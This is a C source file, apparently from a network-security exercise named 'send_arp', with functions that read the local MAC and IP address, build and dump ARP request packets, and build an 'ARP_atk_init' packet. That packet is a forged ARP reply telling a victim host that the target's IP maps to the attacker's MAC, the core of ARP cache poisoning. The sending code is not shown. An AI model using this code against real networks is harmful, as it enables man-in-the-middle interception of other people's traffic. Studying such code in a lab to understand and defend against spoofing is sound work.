#include <linux/types.h>
#include <linux/socket.h>
#include <linux/ioctl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <libnet.h>
#include <string.h>
#include "send_arp.h"


void str_ip(const char * ipstr, __uint8_t * ipbuf) {
    __uint32_t ip;
    struct sockaddr_in ip_addr;
    inet_aton(ipstr, &ip_addr.sin_addr);
    ip = ntohl(ip_addr.sin_addr.s_addr);
    ipbuf[0] = (ip & 0xFF000000)>>24;
    ipbuf[1] = (ip & 0x00FF0000)>>16;
    ipbuf[2] = (ip & 0x0000FF00)>>8;
    ipbuf[3] = (ip & 0x000000FF);

    for(int i=0; i<4; i++) {
        printf("%d", ipbuf[i]);
        if(i!=3) printf(".");
        else printf("\n");
    }
}

int get_mac(__uint8_t * my_mac) {
	int sock_fd;
	struct ifreq ifr;
    char buf[20];
    char * ptr = buf;
    memset(buf, 0, sizeof(buf));

	sock_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (sock_fd < 0) {
		perror("socket error : ");
		return -1;
	}

    strcpy(ifr.ifr_name, "ens33");

	if (ioctl(sock_fd, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl error : ");
		close(sock_fd);
		return -1;
	}
	
    sprintf((char *)buf, "%02x:%02x:%02x:%02x:%02x:%02x", 
        (__uint8_t)ifr.ifr_hwaddr.sa_data[0],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[1],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[2],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[3],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[4],
        (__uint8_t)ifr.ifr_hwaddr.sa_data[5]);

    for(int i=0; i<6; i++) {
        char * end = ptr+2;
        my_mac[i] = (__uint8_t)strtol(ptr, &end, 16);
        ptr += 3;
    }

    for(int i=0; i<6; i++) {
        printf("%02x", my_mac[i]);
        if (i!=5) printf(":");
        else printf("\n");
    }

    close(sock_fd);
    return 0;
}

int get_ip(__uint8_t * my_ip) {
    int sock_fd;
	struct ifreq ifr;
	struct sockaddr_in * sin;
    __uint32_t ip;

	sock_fd = socket(AF_INET, SOCK_STREAM, 0);
	if (sock_fd < 0) {
		perror("socket error : ");
		return -1;
	}

	strcpy(ifr.ifr_name, "ens33");

	if (ioctl(sock_fd, SIOCGIFADDR, &ifr)< 0) {
		perror("ioctl error : ");
		close(sock_fd);
		return -1;
	}

	sin = (struct sockaddr_in*)&ifr.ifr_addr;
    ip = ntohl(sin->sin_addr.s_addr);

    my_ip[0] = (ip & 0xFF000000)>>24;
    my_ip[1] = (ip & 0x00FF0000)>>16;
    my_ip[2] = (ip & 0x0000FF00)>>8;
    my_ip[3] = (ip & 0x000000FF);
    
    for(int i=0; i<4; i++) {
        printf("%d", my_ip[i]);
        if (i!=3) printf(".");
        else printf("\n");
    }

	close(sock_fd);
	return 0;
}

void ARP_req_init(ARP_pkt * arp_request,
                  __uint8_t * my_mac,
                  __uint8_t * my_ip,
                  __uint8_t * sender_ip){
    // Ethernet
    memset(arp_request->dst, 0xff, sizeof(arp_request->dst));
    memcpy(arp_request->src, my_mac, sizeof(arp_request->src));
    arp_request->type = htons(0x0806);
    // ARP
    arp_request->hw_type = htons(0x0001);
    arp_request->p_type = htons(0x0800);
    arp_request->hw_len = 0x06;
    arp_request->p_len = 0x04;
    arp_request->op = htons(0x0001);
    memcpy(arp_request->s_hw_addr, my_mac, sizeof(arp_request->s_hw_addr));
    memcpy(arp_request->s_p_addr, my_ip, sizeof(arp_request->s_p_addr));
    memset(arp_request->t_hw_addr, 0x00, sizeof(arp_request->t_hw_addr));
    memcpy(arp_request->t_p_addr, sender_ip, sizeof(arp_request->t_p_addr));
}

void ARP_pkt_dump(ARP_pkt * arppkt) {
    printf("[ ETHERNET ]\n");

    for(int i=0; i<6; i++)
        printf("%02X ", arppkt->dst[i]);
    printf("\n");

    for(int i=0; i<6; i++)
        printf("%02X ", arppkt->src[i]);
    printf("\n");

    printf("0x%04X", htons(arppkt->type));
    printf("\n\n");

    printf("[ ARP ]\n");

    printf("%04X\n%04X\n%02X\n%02X\n%04X\n",
           htons(arppkt->hw_type),
           htons(arppkt->p_type),
           htons(arppkt->hw_len),
           htons(arppkt->p_len),
           htons(arppkt->op));


}

void ARP_atk_init(ARP_pkt * arp_attack,
                  __uint8_t * sender_mac,
                  __uint8_t * my_mac,
                  __uint8_t * target_ip,
                  __uint8_t * sender_ip){
    // Ethernet
    memcpy(arp_attack->dst, sender_mac, sizeof(arp_attack->dst));
    memcpy(arp_attack->src, my_mac, sizeof(arp_attack->src));
    arp_attack->type = htons(0x0806);
    // ARP
    arp_attack->hw_type = htons(0x0001);
    arp_attack->p_type = htons(0x0800);
    arp_attack->hw_len = 0x06;
    arp_attack->p_len = 0x04;
    arp_attack->op = htons(0x0002);
    memcpy(arp_attack->s_hw_addr, my_mac, sizeof(arp_attack->s_hw_addr));
    memcpy(arp_attack->s_p_addr, target_ip, sizeof(arp_attack->s_p_addr));
    memcpy(arp_attack->t_hw_addr, sender_mac, sizeof(arp_attack->t_hw_addr));
    memcpy(arp_attack->t_p_addr, sender_ip, sizeof(arp_attack->t_p_addr));
}


